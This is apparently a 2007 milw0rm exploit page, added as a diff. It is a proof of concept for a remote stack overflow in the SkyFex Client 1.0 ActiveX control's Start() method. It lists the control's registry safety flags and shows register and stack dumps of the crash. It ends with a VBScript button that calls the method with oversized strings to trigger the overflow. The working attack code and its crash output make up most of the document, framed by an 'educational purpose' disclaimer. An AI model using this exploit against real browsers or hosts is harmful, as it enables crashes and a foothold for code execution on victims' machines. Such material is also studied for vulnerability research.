@@ -1,0 +1,72 @@
+<pre>
+<code><span style="font: 8pt Courier New;"><span class="general1-symbol"><body bgcolor="#E0E0E0">-----------------------------------------------------------------------------
+ <b>SkyFex Client 1.0 "Start()" Method Remote Stack Overflow</b>
+ url: https://skyfex.com/
+
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+
+ <b>Technical details:
+ File: SkyFexClient.ocx
+ Ver.: 1.0.2.77
+ Codebase: https://skyfex.com//download/SkyFexClient.cab#Version=1,0,2,77
+ Marked as:
+ RegKey Safe for Script: True
+ RegKey Safe for Init: True
+ Implements IObjectSafety: False
+ KillBitSet: False</b>
+
+ <b>Registers dump:</b>
+ EAX 007B5A8C
+ ECX 0164224C
+ EDX 033E0024 UNICODE "DDDD..."
+ EBX 00000000
+ ESP 01735244 ASCII "EEE"
+ EBP 0173F414 ASCII "$A"
+ ESI 008A8A8C
+ EDI 033E0024 UNICODE "DDDD..."
+ EIP 02A995E5 SkyFexCl.02A995E5
+
+ <b>Stack dump:</b>
+ 01735244   00454545  IEXPLORE.00454545
+ 01735248   02A60045  RETURN to SkyFexCl.02A60045 from SkyFexCl.02A995C0
+ 0173524C   43434343  urlmon.43434343
+ 01735250   43434343  urlmon.43434343
+ 01735254   43434343  urlmon.43434343
+ 01735258   43434343  urlmon.43434343
+ 0173525C   43434343  urlmon.43434343
+ ...
+
+ 'Sub start (
+ '     ByVal id_client  As String , 
+ '     ByVal ip_server  As String , 
+ ' 	ByVal text_ser  As String , 
+ ' 	ByVal url_page  As String , 
+ ' 	ByVal bDebug  As Integer 
+ ' )
+ 
+ <b><font color='red'>This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.</font></b>
+
+ Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
+-----------------------------------------------------------------------------
+<object classid='clsid:F84E0B64-1E86-4640-8094-5B38CEB28C1E' id='test'></object>
+
+<input language=VBScript onclick=tryMe() type=button value='Click here to start the test'>
+
+<script language='vbscript'>
+  Sub tryMe
+   id_client = String(16676, "A")
+   ip_server = String(2000, "B")
+   text_ser = String(2000, "C")
+   url_page = String(4539717, "D")
+   bDebug = 484
+       
+   test.start id_client, ip_server, text_ser, url_page, bDebug
+ End Sub
+</script>
+</span></span>
+</code></pre>
+
+# milw0rm.com [2007-12-28]
